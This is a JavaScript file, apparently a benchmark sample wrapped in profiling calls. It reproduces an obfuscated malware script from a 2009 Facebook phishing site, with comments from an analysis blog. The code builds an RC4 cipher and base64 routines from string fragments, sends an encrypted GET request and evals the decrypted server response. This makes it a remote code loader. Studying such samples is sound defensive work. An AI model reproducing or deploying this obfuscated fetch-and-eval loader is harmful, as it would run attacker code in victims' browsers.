
JAM.startProfile('load');
introspect(JAM.policy.pFull) {
// Code and text downloaded 2014-12-09 from
// http://www.schillmania.com/content/entries/2009/javascript-malware-obfuscation-analysis/
/*
Holy Crap, This Thing Is Bad (Or, "Latin Lingo")

This particular beast was found in the wild in May 2009 on a site phishing for Facebook user credentials, and is a particularly-nasty bugger. Note the number of strangely-named variables created up front, many of which are not even referenced in the code blocks that follow. Additionally notice the odd ternary statements which have no impact on the operation of the code, and presumably must exist to trip up scanners (unless there is a fancy form of string replacement on the body of some functions, in which case the functions could be mutated before execution - and that would be scary. A cipher based on the body of the function has also been seen.)

Additionally, there is evidence of concatenating a string to be used for decryption/decoding and/or string substitution, in addition to string concatenation for referencing object attributes and methods eg. window and open(), as well as numerous deeply-nested function calls.
*/

/*
This script defines a mix of variables and functions, interleaved in blocks. Perhaps incomplete or buggy, it didn't seem to actually do anything when run; a second copy was later downloaded - the "encryption" algorithm seemed to change very quickly, as you'll see - and despite still not working, an analysis was attempted nonetheless.
*/

vaccae = 8211;
manere = '?';
mate = "661";
movens = "7e0";
ageque = "222";
obitus = 81;
apibus = 'ar';
lugebo = 'G';
dolori = "T";
acamas = "";
fulcra = 'nt';
colis = 'dy';
insis = 42;
diram = "ponse";
rimer = "8.";
decas = "n";
solant = '';
beatas = 6911;
tege = 814;
salmon = 'ASH';
capies = 'vwxyz01234';
adit = 'h';
fibula = 1;
ueluti = 256;
apum = "ea";
petat = 6;
dice = "ain";
testem = '.6';
tulit = 'gl';
visque = "p";
igitur = 64;
hoon = "e";
quires = 'do';
sinu = 'F';
gyri = 'dow';
audet = 'T';
nostro = 28;
quidem = 'L';
corna = 'et';
volvat = '854';
lectae = "0.59";
deoque = "9.276e3";
revoco = 'c';
veste = 55;
uisae = 'r';
anci = "4864";
tmarii = 'ow';
tuorum = 8921;
mdcqve = "t";
solari = 'l';
uisque = '10';
flendo = 3645;
cautum = 'at';
aderis = "dd";
uique = 'UNI';
avidum = 'o';
obsum = '.734';
portae = 838;
orant = '.25';
sinis = 8023;
turkey = 'en';
bogong = 8418;
vastis = 507;
funere = 9;
educam = 2425;
frenem = '#';
gladie = '(';
arti = 487;
oriens = 9485;
praue = 59;
urbum = 'au';
itas = 'wl';
aulide = 3007;
killer = 8;
unda = 'Y';
pastor = 'f';
velit = 5;
gunyah = 'tW';
niveae = 6438;
aequi = 'ret';
arctos = 'ghijk';
beroen = 'v';
pontet = 21;
rixae = 't';
danaos = 4;
lisci = 'xml';
verbis = '[H';
auersa = "body";
merui = 'n';
scylla = 'ie';
delato = 'y';
call = '.7';
risque = 'tV';
usoque = 'H';
cupidi = 'w';
famae = 'g';
incuso = 7;
campo = 's';
ungu = 71;
leti = 62;
ciebo = 2839;
amaras = 7783;
mens = "m";
punt = 're';
inibis = ' ';
eicio = 'K';
gimlet = 'ult';
ictui = "925";
nactus = '[';
silex = 26;
tonsa = "set";
tactui = "ri";
ludat = 'a';
tuti = 'self';
serva = 'A';
tactus = 0;
pioque = 119;
moles = 587;
primam = 'fault';
genite = 'O';
divico = '4';
foret = 2;
arcet = 'ML';
causae = "a";
apollo = 'e';
abditi = 'Q';
uagos = 23;
arcum = 'p';
parto = 'um';
mollio = 'el';
impia = 'M';
exeras = 'us';
gnati = (0.436, 'AB' + 'CDE' + 'F');
amoris = ('.930' > 65 ? 9e0: 'ring' + '');
function raucam(vecte) {
    obque = new vecte()
}
function matrem(fretus, bull) {
    for (famam = 0; famam < fretus; famam++) bull[famam] = famam
}
function tenuem(natant, arces) {
    for (famam = 0; famam < natant; famam++) {
        unius = (unius + obque[famam] + arces[claram](famam % arces[tranta])) % natant;
        velat = obque[famam];
        obque[famam] = obque[unius];
        obque[unius] = velat
    }
}
function fateor(fores, bickie) {
    famam = (famam + 1) % bickie;
    unius = (unius + obque[famam]) % bickie;
    piker();
    obque[unius] = velat;
    ferro(fores)
}
function piker(durum) {
    velat = obque[famam];
    obque[famam] = obque[unius]
}
function ferro(banjo) {
    tranem += quintyye[otii](banjo[claram](artis) ^ obque[(obque[famam] + obque[unius]) % 256])
}
function iamque(fores) {
    for (artis = 0; artis < fores[tranta]; artis++) {
        fateor(fores, 256)
    }
}
function neget(jabiru) {
    famam = jabiru;
    unius = jabiru
}
signa = (11. > 155 ? .218 : cient);
ducere = (.19, 'a');
('.3' < 8 ? signa: 6.)((8123., this));
mearum = (".77" > portae ? 2.36e2: pueros);
gnati += (ciebo >= divico ? '' + lugebo + usoque + 'I' + 'J' + eicio + quidem + impia + 'N' + 'O' + '': 0.51);
darent = (28 < "274" ? tabo: .55);
audiet = (9., iove);
puella = (4.51e2 < 0.28 ? 0.7 : decora);
tacitiyye = (6, darent);
obicis = (3e0, audiet)[(.1865 >= obsum ? 1.18e2: "documen" + "t")];
otii = (3.454e3 <= lectae ? 17 : 'fro') + (4.884e3, 'mC') + (.41 <= '0.5261' ? 'har': 1e0) + (0.78 <= 7 ? 'C': 8e0) + (4.834e3, 'ode');
tranta = (7e0, '' + 'le' + '') + (.967, 'ng') + (8e0, '' + 't' + adit + solant);
gnati += ('.7' < 4e0 ? solant + 'P' + 'Q' + 'R' + 'S' + audet + 'U' + solant: 1.118e3) + (.30, '' + 'VW' + 'X' + unda + 'Z');
cursui = (3532 > 230 ? 'ra' + delato: 1.88e2);
tumida = (8.8e1 > 302 ? 6912 : cautum + 'h' + solant);
uana = (.7 < 9.83e2 ? puella: foret);
sentio = (.643, 'unc') + (827, rixae + 'io' + 'n' + solant);
nepos = ("884" <= 8424 ? obicis: .826);
gnati += (.4 >= '923.' ? .46 : 'ab' + 'cd' + 'e') + ('.92' > 5. ? 3 : 'f' + arctos + 'lm');
ducis = (".7" > 0.9 ? 341.: 'e');
itavit = ('5.469e3' > 0.6404 ? nepos: 71);
volito = (9 >= 9706. ? beatas: evado);
palmam = (.1134 >= .97 ? 9.45e2: 'va');
gnati += (88. < '105.' ? solant + merui + 'o' + 'p' + 'q' + 'r' + 's' + rixae + 'u' + solant: funere) + (0.8, capies + solant) + (31 > '4091' ? .3 : solant + '5' + '6' + '7' + '8' + '9' + '+' + '/' + '=' + solant);
claram = (937, 'ch') + (261., 'arC') + (.491 < 441. ? solant + 'o' + 'd' + 'e' + serva + 't' + solant: 7.);
if ((.335, gnati)[("1493" >= .406 ? ducis: 89) + (.1 < '8.8e2' ? palmam: 91) + (0.902, 'l')]) {
    gnati = (.147, solant);
    itavit = (5 > '.3' ? gnati: .49)
}
miseri = (veste > 9.3e1 ? 968.: solant + 'o' + 'r' + 'ag' + 'e');
sibi = (7.96e2 <= .9 ? pontet: tulit);
metuet = (69, 'oba');
satque = (59, itavit);
function evado(cupiet, bluey, furens, koel) { ("8.176e3" >= moles ? raucam: 6e0)((2932., caedumaai));
    (0.48, matrem)((5. < 0.885e3 ? 256 : 96.), (flendo, obque));
    (6543 <= 106. ? 4464.: neget)(("0.1" >= 875. ? silex: 0));
    (38 <= 3 ? 952 : tenuem)((killer, ueluti), ("7.13e2" <= 4e2 ? 8.9e1: cupiet));
    (nostro, neget)(("23." >= .2 ? 0 : 67.));
    tranem = (476 >= 2.25e2 ? '': 49);
    (8e0, iamque)((9.974e3, bluey));
    return (3, tranem)
}
amoqueyya = (call >= 1647. ? 39.: satque);
function decora(aetas, stygis, mode, rhenum) {
    var iacit;
    return ('0.5' <= 6. ? iacit: 0.2)
}
arsiyya = new(3.2e1 <= .582 ? .876 : caedumaai)();
saltem = (.475, deerat);
obest = (49., ducere) + ('9527' < 9.06e2 ? 4585.: tacitiyye)((killer, gnati), (6940, 30));
paroneez = (3761., ducque);
sedas = (7689., saltem)((funere, 'r' + corna) + (0.536 <= 3998 ? solant + 'u' + uisae + 'n' + ' ' + solant: 3) + (5.734e3, '' + 'uana' + gladie + ')' + solant));
audiviiie = (vaccae, saltem)((petat, 'x'), (3e0, delato), (809, solant + 'r' + apollo + rixae + solant) + (3.3e1 <= 2. ? 3e1: 'u' + 'r' + merui + inibis) + (.7834 > 593. ? 9e0: solant + beroen + 'ol' + 'it' + 'o(' + 'x,' + delato + ')'));
figoeei = (3., saltem)(('3' <= 8.3e1 ? solant + 'x': 384.), (funere, aequi) + (6661 <= movens ? .4138 : solant + 'u' + uisae + merui + inibis + solant) + (178., beroen + 'o' + 'ca' + 'n' + campo + gladie + 'x' + ')'));
exuta = (645., '' + 'onr' + apollo) + (698 <= 41 ? 1173 : ludat + colis + campo + rixae) + (.97, 'atec') + ("84." <= vastis ? solant + adit + ludat + 'n' + famae + apollo + solant: 1.8e1);
(.9414, figoeei)((.51 < 1.2e1 ? obest: 965.));
function vocans(equo, novus, illas, fracp) {
    var texes = (6.49e2 < 3. ? 77.: sedas)();
    (50 <= 472 ? texes: 5.738e3)[(ungu, acamas + "o" + "p" + hoon + decas + "")]((0.7198 > .352 ? 'GET': 76.), (9e0, manere) + (velit < arti ? paroneez: 275)((.24, audiviiie)((978., solant + revoco + 'ra' + itas + 'o' + 'ov' + ''), (9.677e3 < 36. ? .765 : equo))), ("5.49e2" < 9.697e3 ? true: 948));
    (.16 > tege ? 6 : texes)[(0.18, exuta)] = function() {
        if ((0.13e2, texes)[(3218. < "2.7e2" ? 30.: "r" + "e" + "ad" + "y" + "S" + "ta" + mdcqve + hoon)] == (1, danaos) && (5490 <= "53" ? 0.575 : texes)[(3, "" + "s" + "t" + causae + "t" + "u" + "s" + "")] == ('2e0' > 900 ? 2e0: 200)) { (6905., saltem)((2.505e3, audiviiie)((2e0 >= '34' ? 4e1: equo), (".4" <= .66 ? mearum: 7.)((0.2, texes)[(3023 < 6.934e3 ? "res" + diram + dolori + hoon + "xt": .12)])))()
        }
    };
    (.12, texes)[(1.973e3 >= 4.131e3 ? .3288 : acamas + "s" + "e" + decas + "d")]((8.034e3, tactus))
}
function foras(cupiet, inimus, iacto, pontes) {
    var skivvy = emicatmoj["floor"](emicatmoj["random"]() * cupiet[tranta]);
    foeda += cupiet["substring"](skivvy, skivvy + 1)
}
function teneat(bluey, cupiet, foeda, stem) {
    for (famam = 0; famam < bluey; famam++) {
        foras(cupiet, famam, bluey, foeda);
    }
}
function tabo(cupiet, bluey, stem, stubby) {
    foeda = '';
    teneat(bluey, cupiet, foeda, stem);
    return foeda
}
function ducque(troiae, oberat, effata, mergi) {
    var servo = (killer <= 94 ? '': .9);
    var tranem;
    var famam;
    var uouero = (ageque >= .5 ? tactus: 66);
    var ardua = ('850' >= .59 ? fibula: insis);
    famam = (2.895e3 < "2151" ? .923 : 0);
    for (tranem = 0; famam < troiae[tranta]; famam++, tranem++) {
        uouero = uouero * 256 + troiae[claram](famam);
        ardua = ardua * 4;
        servo = servo + gnati["charAt"](parseInt(uouero / ardua));
        uouero = uouero % ardua;
        if (ardua == 64) {
            servo = servo + gnati["charAt"](parseInt(uouero));
            uouero = 0;
            ardua = 1;
            tranem++
        }
        if (tranem >= 75) {
            tranem = -1;
            servo = servo + '\n'
        }
    }
    if ((3e0, famam) % (3.996e3 <= '9' ? danaos: 3)) {
        servo = servo + gnati["charAt"](parseInt(uouero * ((famam % 3 == 1) ? 16 : 4)));
        servo = servo + ((famam % 3) == 1 ? '==': quintyye[otii](61))
    }
    return ("0.7" > 91 ? 616.: servo)
}
function pueros(troiae, salsis, dumque, initur) {
    var servo = (56., '');
    var famam;
    var uouero = (164, tactus);
    var ardua = (2e0 >= "86." ? 904 : fibula);
    for (famam = 0; famam < troiae[tranta]; famam++) {
        if (troiae["charAt"](famam) == quintyye[otii](61) || troiae["charAt"](famam) == '\n') break;
        uouero = uouero * 64 + gnati["indexOf"](troiae["charAt"](famam));
        ardua = (ardua == 1 ? 64 : ardua / 4);
        if (ardua != 64) {
            servo = servo + quintyye[otii](parseInt(uouero / ardua));
            uouero = uouero % ardua
        }
    }
    return (786, servo)
}
function cient(dolum, fracs, dulce, agamus) {
    this[(84., "iove")] = (667., dolum);
    if ((7.345e3, dolum)[(1423 <= "8.667e3" ? acamas + visque + causae + "r" + hoon + decas + mdcqve + "": 868)] == (5.2e1, dolum)) {
        iactet = (.35, solant + ludat + '')
    } else {
        ducere += (7.25e2, solant + '@' + solant)
    }
}

}

JAM.stopProfile('load');
